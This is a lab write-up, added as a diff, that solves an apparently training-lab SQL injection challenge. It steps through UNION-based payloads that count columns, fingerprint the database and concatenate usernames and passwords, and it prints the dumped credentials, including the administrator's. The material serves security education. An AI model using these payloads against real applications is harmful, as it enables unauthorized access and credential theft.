@@ -1,0 +1,60 @@
+LAB 05 - SQL injection UNION attack, retrieving multiple values in a single column
+
+SQL Injection - Product category filter
+
+End Goal: Retrieve all usernames and passwords then login as the administrator user.
+
+Analysis:
+---------
+
+1. Find the number of columns that the vulnerable query is using:
+Iteratively execute ORDER BY <NUM> to find number of columns in the table.
+
+' ORDER BY 1-- // not displayed on page (likely product category id)
+' ORDER BY 2-- // displayed on the page
+' ORDER BY 3-- // internal error
+
+--> number of columns is 2
+
+2. Find which columns contain text
+We want to get usernames and passwords, which are of type text/string, so we only care about columns of type text.
+
+' UNION SELECT 'a', NULL-- // not a useful test because we can't view the results on the page, but let's try it anyway
+' UNION SELECT NULL, 'a'-- // accepts text (product category name)
+
+3. Output data from other tables (users table is what we want)
+Issue: We only have 1 column to output data in, but we want 2 columns to output data (username and password)
+Solution: Run a query to display usernames first, then run another query to display the passwords
+
+' UNION SELECT NULL, username FROM users--
+' UNION SELECT NULL, password FROM users--
+
+Issue: Doing this in two separate queries suck though... we want to see both username and password in one query in the same row
+Solution: Use SQL string concatenation
+- Oracle     : 'foo'||'bar'
+- Microsoft  : 'foo'+'bar'
+- PostgreSQL : 'foo'||'bar'
+- MySQL      : 'foo' 'bar' OR CONCAT('foo','bar')
+
+But, we don't know what database we are using... So we need to figure that out first.
+We can do this by running the query to check the database's version.
+- Oracle     : SELECT banner FROM v$version OR SELECT version FROM v$instance
+- Microsoft  : SELECT @@version
+- PostgreSQL : SELECT version()
+- MySQL      : SELECT @@version
+
+' UNION SELECT NULL, @@version-- // to test for Microsoft DB -> Internal Server Error -> Not Microsoft DB
+' UNION SELECT NULL, version()-- // to test for PostgreSQL -> Success -> Use PostgreSQL string concatenation syntax
+
+' UNION SELECT NULL, username || password FROM users-- // this works but there is no space between username and password
+' UNION SELECT NULL, username || '~' || password FROM users--
+
+Output:
+wiener~jkffshtpfjo97lw9rxd1
+carlos~siawxu0ccnvkcc74bgoh
+administrator~zoncguwk1ph12id6g9xn
+
+================================================================================================================================
+Python Script Usage:
+script.py <url>
+
